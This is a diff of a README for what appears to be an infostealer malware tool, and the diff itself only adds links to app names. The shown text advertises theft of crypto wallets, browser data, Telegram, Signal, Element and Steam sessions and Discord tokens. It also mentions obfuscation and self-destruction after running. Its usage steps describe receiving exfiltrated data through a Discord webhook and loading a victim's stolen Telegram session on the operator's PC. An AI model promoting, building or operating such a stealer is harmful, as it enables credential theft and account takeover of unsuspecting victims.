@@ -55,11 +55,11 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] Crypto Wallets 
    > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
 - [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
-- [x] Telegram Session Stealer 
-- [x] Element Session Stealer 
-- [x] Signal Session Stealer 
-- [x] Steam Session Stealer 
-- [x] Extracts Discord Token
+- [x] [Telegram](https://telegram.org) Session Stealer 
+- [x] [Element](https://element.io) Session Stealer 
+- [x] [Signal](https://signal.org) Session Stealer 
+- [x] [Steam](https://store.steampowered.com) Session Stealer 
+- [x] Extracts [Discord](https://discord.com) Token
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
 - [x] Takes Desktop Screenshot  
 - [x] Get System Uptime 
@@ -73,7 +73,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] Extracts Product Key
 - [x] Self-Destructs After Execution (optional)
 
-### Telegram-Stealer Usage :
+### Telegram Session Stealer Usage :
 After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, inside that folder there will also be another zipped folder ```telegram-session.zip``` extract it on your PC.
 Now, copy the tdata folder and paste it in the directory below:
 
